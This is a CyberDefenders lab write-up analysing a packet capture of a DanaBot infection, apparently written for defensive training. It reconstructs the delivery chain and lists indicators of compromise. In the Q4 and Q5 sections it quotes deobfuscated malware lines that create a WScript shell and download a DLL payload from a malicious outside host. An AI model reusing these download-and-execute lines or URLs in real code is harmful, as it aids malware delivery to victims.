
# DanaBot Lab Write Up
**Platform:** CyberDefenders

---

## Scenario
The SOC team has detected suspicious activity in the network traffic, revealing that a machine has been compromised. Sensitive company information has been stolen. Your task is to use Network Capture (PCAP) files and Threat Intelligence to investigate the incident and determine how the breach occurred.

---

## Objective
Analyze network traffic using Wireshark to identify DanaBot initial access, deobfuscate malicious JavaScript, and extract IOCs like IPs, file hashes, and execution processes. <br><br>
**Category:** Network Forensics <br>
**Difficulty:** Easy <br>

---

## Investigation Scope

This investigation focuses on reconstructing the suspected DanaBot infection chain by analyzing network traffic, examining recovered JavaScript and payloads, and correlating findings with relevant malware analysis reports.

The investigation covers:

- Identifying the investigated host and the suspected initial access and malware delivery sequence.
- Recovering transferred files and deobfuscating JavaScript to reveal download URLs and intended behavior.
- Tracing subsequent payload downloads and identifying the processes referenced for execution.
- Examining outbound communications for evidence of command-and-control activity.
- Correlating recovered file hashes and script behavior with reputation and sandbox analysis results.
- Extracting relevant IP addresses, domains, URLs, file names, and hashes, and reconstructing an evidence-supported attack timeline.

---

## Environment

### Analysis Setup

- **Host operating system:** Fedora Linux 44
- **Analysis operating system:** Kali Linux
- **Virtualization platform:** Oracle VirtualBox

### Analysis Tools & Tactics
- **Tools:** Wireshark, VirusTotal, ANY.RUN, Network Miner
- **Tactics:** Execution, Command and Control

### Artifacts
The analysis uses one provided artifact:

- `205-DanaBot.pcap` - network traffic associated with the incident.

---

## Investigation

**Q1. Which IP address was used by the attacker during the initial access?**

**Steps taken:**

1. Reviewed the initial DNS and HTTP traffic in Wireshark.
2. Identified a DNS query for `portfolio.serveirc.com` and its response containing `62.173.142.148`.
3. Examined the subsequent connection and `GET /login.php` request to the same IP address.
4. Reviewed the HTTP response and the VirusTotal report shown in the supporting screenshots.

- **Evidence:**
  - Packet **1**, at relative timestamp `0.000000`, shows `10.2.14.101` querying `portfolio.serveirc.com` through `10.2.14.1`.
  - Packet **2**, at `0.154098`, shows the DNS response containing **62.173.142.148**.
  - Packet **3**, at `0.154701`, shows `10.2.14.101` initiating a TCP connection to `62.173.142.148` on port **80**.
  - Packet **6**, at `0.340304`, shows `GET /login.php HTTP/1.1` sent to `62.173.142.148`.
  - Packet **11**, at `0.524731`, shows an **HTTP 200 OK** response from that server.
  - The supplied VirusTotal report shows **16/93** detections and crowdsourced context associating `portfolio.serveirc.com` with DanaBot.
  - The DNS response and subsequent HTTP exchange identify **62.173.142.148** as the delivery server associated with the initial-access activity.

- **Supporting Screenshots:**
  <img width="1860" height="637" alt="Q1-1" src="https://github.com/user-attachments/assets/9384b709-f3e7-4063-97f4-5d23b412092f" />
  <img width="1702" height="957" alt="image" src="https://github.com/user-attachments/assets/deff08f3-a2e9-42d7-9269-7286775be33b" />

- **Flag:** `62.173.142.148`

**Q2. What is the name of the malicious file used for initial access?**

**Steps taken:**

1. Reviewed the HTTP stream containing the `GET /login.php` request to `portfolio.serveirc.com`.
2. Examined the headers of the server's **HTTP 200 OK** response.
3. Located the **Content-disposition** header and read its `filename` value.
4. Identified the attachment filename as **allegato_708.js** and observed obfuscated JavaScript in the response body.

- **Evidence:**
  - The HTTP request specifies `GET /login.php HTTP/1.1` with the host `portfolio.serveirc.com`.
  - The response includes the following header:
    ```http
    Content-disposition: attachment;filename=allegato_708.js
    ```
  - The response also specifies `Content-Type: application/octet-stream`, followed by obfuscated JavaScript code.
  - The attachment metadata identifies **allegato_708.js** as the file delivered by the `/login.php` endpoint.

- **Supporting Screenshot:**
  <img width="1234" height="867" alt="image" src="https://github.com/user-attachments/assets/525cd330-daad-461e-8a19-a09adbeaf222" />

- **Flag:** `allegato_708.js`

**Q3. What is the SHA-256 hash of the malicious file used for initial access?**

**Steps taken:**

1. Reviewed the HTTP objects in Wireshark's **Export Objects** window.
2. Located the object associated with packet **11**, from `portfolio.serveirc.com`, listed as `login.php` with a size of **5,558 bytes**.
3. Saved the object as `login.php`.
4. Ran `sha256sum login.php` in the Linux terminal.
5. Recorded the SHA-256 value returned by the command.

- **Command:**
  ```bash
  sha256sum login.php
  ```

- **Evidence:**
  - The HTTP object list shows packet **11**, hostname `portfolio.serveirc.com`, content type `application/octet-stream`, and size **5,558 bytes** for `login.php`.
  - The object is listed as `login.php`, while the response header examined in Q2 specifies the attachment filename **allegato_708.js**.
  - The terminal screenshot shows `sha256sum login.php` returning:
    ```text
    847b4ad90b1daba2d9117a8e05776f3f902dda593fb1252289538acf476c4268
    ```
  - This is the SHA-256 of the exported initial-access JavaScript object.

- **Supporting Screenshots:** <br>
  <img width="753" height="524" alt="image" src="https://github.com/user-attachments/assets/20c6b395-c557-4a07-bf13-2c680b29412a" /> <br>
  <img width="1234" height="867" alt="image" src="https://github.com/user-attachments/assets/72622f21-1e14-4098-98cc-da06ea08ee12" />

- **Flag:** `847b4ad90b1daba2d9117a8e05776f3f902dda593fb1252289538acf476c4268`

**Q4. Which process was used to execute the malicious file?**

**Steps taken:**

1. Reviewed the deobfuscated source of the initial-access JavaScript, `allegato_708.js`, in [Obfuscator.io Deobfuscator](https://obf-io.deobfuscate.io/).
2. Identified calls to `WScript.CreateObject(...)` in the recovered code.

- **Relevant Code:**
  ```javascript
  var _0x1e16b0 = WScript.CreateObject("Wscript.Shell");
  ```

- **Evidence:**
  - The deobfuscated source uses the `WScript` object and its `CreateObject()` method, providing Windows Script Host context for the initial JavaScript.
  - **WScript.exe** is the script host identified for the initial JavaScript stage in this lab. Microsoft documents `wscript` as a script host supporting `.js` files: [wscript documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wscript).

- **Supporting Screenshot:**
  <img width="1669" height="751" alt="image" src="https://github.com/user-attachments/assets/e0c3edcc-4831-4f6b-9d38-b96ff855b4a2" />

- **Flag:** `WScript.exe`

**Q5. What is the file extension of the second malicious file utilized by the attacker?**

**Steps taken:**

1. Reviewed the deobfuscated JavaScript and identified the download URL `http://soundata.top/resources.dll`.
2. Examined the filename-generation function, which appends `.dll` to the generated name.
3. Reviewed the HTTP object list in Wireshark and located `resources.dll` from `soundata.top`.
4. Checked the supplied VirusTotal **Relations** tab, which lists the same URL under **Contacted URLs**.

- **Relevant Code:**
  ```javascript
  return _0x119065 + ".dll";
  _0x5da57f.Open("GET", "http://soundata.top/resources.dll", false);
  ```

- **Evidence:**
  - The filename-generation function returns a name ending in **.dll**.
  - The HTTP request in the script targets `http://soundata.top/resources.dll`.
  - Wireshark lists an HTTP object associated with packet **9952**, from `soundata.top`, with the filename **resources.dll** and a displayed size of **11 MB**.
  - The supplied VirusTotal report also lists `http://soundata.top/resources.dll` under **Contacted URLs**.
  - These matching references identify **.dll** as the second malicious file's extension.

- **Supporting Screenshots:** <br>
  <img width="515" height="603" alt="Q5-1" src="https://github.com/user-attachments/assets/36ac1dc5-6332-45d6-b1ee-718e272e1b95" /><br>
  <img width="749" height="519" alt="image" src="https://github.com/user-attachments/assets/a87294b9-8257-451b-b642-b33da07c36f9" /><br>
  <img width="1682" height="860" alt="image" src="https://github.com/user-attachments/assets/147f5fc7-087c-40a8-b688-5d3d7d29adf9" />

- **Flag:** `.dll`

**Q6. What is the MD5 hash of the second malicious file?**

**Steps taken:**

1. Reviewed the HTTP objects in Wireshark's **Export Objects** window.
2. Located `resources.dll` from `soundata.top`, associated with packet **9952** and displayed with a size of **11 MB**.
3. Saved the object as `resources.dll`.
4. Ran `md5sum resources.dll` in the Linux terminal and recorded the returned MD5 value.

- **Command:**
  ```bash
  md5sum resources.dll
  ```

- **Evidence:**
  - The HTTP object list shows **resources.dll** from `soundata.top`, with content type `application/octet-stream`, packet **9952**, and a displayed size of **11 MB**.
  - The terminal screenshot shows `md5sum resources.dll` returning:
    ```text
    e758e07113016aca55d9eda2b0ffeebe
    ```
  - This MD5 identifies the exported **resources.dll**, the second malicious file.

- **Supporting Screenshots:** <br>
  <img width="746" height="513" alt="image" src="https://github.com/user-attachments/assets/be9cdac3-fa54-48c7-be4f-ef1e6b816ad8" /> <br>
  <img width="524" height="59" alt="image" src="https://github.com/user-attachments/assets/6fef30be-f639-4ad2-b383-97cad81e34eb" />

- **Flag:** `e758e07113016aca55d9eda2b0ffeebe`

## Findings

The documented investigation reconstructed a two-stage delivery chain: an obfuscated JavaScript attachment retrieved through `portfolio.serveirc.com/login.php`, followed by a DLL retrieved from `soundata.top`.

1. **Initial delivery infrastructure:** The investigated host, `10.2.14.101`, resolved `portfolio.serveirc.com` to `62.173.142.148`, connected to port **80**, and requested `/login.php`. The server returned **HTTP 200 OK**. **Evidence: Q1.**
2. **Initial file identity:** The response's `Content-disposition` header identified the attachment as **allegato_708.js**. Wireshark listed the same HTTP object as **login.php**, with a size of **5,558 bytes**. Its SHA-256 was calculated from the exported object. **Evidence: Q2–Q3.**
3. **Second-stage payload:** The deobfuscated JavaScript referenced `http://soundata.top/resources.dll` and generated filenames ending in `.dll`. Wireshark's HTTP object list contained **resources.dll**, associated with packet **9952** and displayed with a size of **11 MB**. Its MD5 was calculated after export. **Evidence: Q5–Q6.**
4. **Execution context:** Q4 identified **WScript.exe** as the host for the initial JavaScript. The recovered source uses `WScript` APIs and contains a later `rundll32.exe` command for the saved DLL payload. These represent separate stages; the supplied evidence does not include a runtime process trace. **Evidence: Q4 and its deobfuscated source screenshot.**
5. **Threat-intelligence corroboration:** The supplied VirusTotal report associated `portfolio.serveirc.com` with suspicious activity and included crowdsourced DanaBot context. The JavaScript report's **Relations** tab also listed the `resources.dll` URL. These reports supplement the direct network and file evidence. **Evidence: Q1 and Q5.**

### Reconstructed Timeline

Times below are relative seconds from the documented Wireshark view.

| Relative time (seconds) | Packet | Observed activity |
| --- | --- | --- |
| `0.000000` | **1** | `10.2.14.101` queries `portfolio.serveirc.com` through `10.2.14.1`. |
| `0.154098` | **2** | The DNS response contains `62.173.142.148` for the queried domain. |
| `0.154701` | **3** | The investigated host initiates a TCP connection to `62.173.142.148:80`. |
| `0.340304` | **6** | The host sends `GET /login.php HTTP/1.1`. |
| `0.524731` | **11** | An **HTTP 200 OK** response carries the JavaScript attachment, exported as `login.php`. |

---

## Indicators

### Network Indicators

| Type | Value | Context |
| --- | --- | --- |
| Initial delivery IP | `62.173.142.148` | DNS answer followed by the initial HTTP connection. |
| Initial delivery domain | `portfolio.serveirc.com` | Domain queried by the investigated host. |
| Initial delivery URL | `http://portfolio.serveirc.com/login.php` | Reconstructed from the HTTP host, request path, and port. |
| Second-stage delivery domain | `soundata.top` | Referenced in the script and HTTP object list. |
| Second-stage URL | `http://soundata.top/resources.dll` | DLL download URL recovered from the script and corroborated by the supplied VirusTotal report. |

### File Indicators

| Stage | Filename | Context |
| --- | --- | --- |
| Initial JavaScript | `allegato_708.js` | Attachment filename specified by the HTTP response. |
| Initial JavaScript export | `login.php` | Name shown for the exported **5,558-byte** JavaScript object. |
| Second payload | `resources.dll` | Downloaded and exported DLL object; displayed size **11 MB**. |

**SHA-256 — initial JavaScript, exported as login.php:**

```text
847b4ad90b1daba2d9117a8e05776f3f902dda593fb1252289538acf476c4268
```

**MD5 — resources.dll:**

```text
e758e07113016aca55d9eda2b0ffeebe
```
---

## Lessons Learned and References

### Lessons Learned

- **Correlate request paths with attachment metadata.** `/login.php` was the requested endpoint and exported object name, while the response identified the attachment as `allegato_708.js`.
- **Preserve original bytes before hashing.** Calculate hashes from the recovered HTTP objects before editing or deobfuscating their contents. Copying text or adding a newline can change the resulting hash.
- **Use deobfuscation to connect stages.** The recovered JavaScript exposed the second-stage URL and `.dll` filename suffix.
- **Distinguish the script host from the DLL launcher.** The initial JavaScript host and the command constructed for the subsequent DLL have different roles in the chain.
- **Keep conclusions tied to their evidence.** Network captures establish transfers, static analysis reveals intended behavior, and reputation reports provide external context. Endpoint telemetry would help validate execution and any later activity.

### References
- [Obfuscator.io Deobfuscator](https://obf-io.deobfuscate.io/)
- [VirusTotal - initial JavaScript report, Relations tab](https://www.virustotal.com/gui/file/847b4ad90b1daba2d9117a8e05776f3f902dda593fb1252289538acf476c4268/relations)
- [Microsoft Learn - wscript](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wscript)








